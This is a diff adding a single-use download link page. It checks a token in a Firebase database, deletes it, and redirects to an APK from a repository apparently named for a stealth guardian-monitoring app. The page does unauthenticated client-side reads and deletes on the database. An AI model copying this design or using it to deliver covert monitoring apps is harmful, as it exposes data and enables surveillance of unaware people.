@@ -1,0 +1,71 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Redirecting...</title>
+  <style>body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:32px}</style>
+</head>
+<body>
+  <h1 id="status">Verifying link...</h1>
+  <p id="detail"></p>
+
+  <script>
+    // CONFIG - edit these:
+    const firebaseDbUrl = '<FIREBASE_DB_URL>'; // e.g. https://your-project-id.firebaseio.com
+    // direct download URL to the uploaded release asset (pattern: /releases/latest/download/<asset-name>)
+    const downloadUrl = 'https://github.com/CoreyD84/mommastealth/releases/latest/download/app-release.apk';
+
+    // read query params
+    const params = new URLSearchParams(location.search);
+    const token = params.get('token');
+    const guardianId = params.get('guardianId');
+
+    const statusEl = document.getElementById('status');
+    const detailEl = document.getElementById('detail');
+
+    if (!token || !guardianId) {
+      statusEl.textContent = 'Invalid link';
+      detailEl.textContent = 'Missing token or guardianId.';
+      throw new Error('Missing token/guardianId');
+    }
+
+    // Firebase REST path to the token
+    const tokenPath = `${firebaseDbUrl}/guardianLinks/${encodeURIComponent(guardianId)}/pendingTokens/${encodeURIComponent(token)}.json`;
+
+    async function validateAndRedirect() {
+      try {
+        statusEl.textContent = 'Checking token...';
+        // GET to check existence
+        const getRes = await fetch(tokenPath, { method: 'GET' });
+        if (!getRes.ok) throw new Error('Network error checking token');
+
+        const tokenValue = await getRes.json();
+        if (tokenValue === null) {
+          statusEl.textContent = 'Link expired or invalid';
+          detailEl.textContent = 'This token was not found or already used.';
+          return;
+        }
+
+        statusEl.textContent = 'Token valid — preparing download...';
+        // Delete token so link can be single-use
+        const delRes = await fetch(tokenPath, { method: 'DELETE' });
+        if (!delRes.ok) {
+          // not fatal — proceed but warn
+          detailEl.textContent = 'Warning: could not delete token (will still redirect).';
+        }
+
+        // Redirect to the GitHub release asset (this starts a download)
+        statusEl.textContent = 'Redirecting to download...';
+        location.replace(downloadUrl);
+
+      } catch (err) {
+        statusEl.textContent = 'Error';
+        detailEl.textContent = err.message || String(err);
+      }
+    }
+
+    validateAndRedirect();
+  </script>
+</body>
+</html>
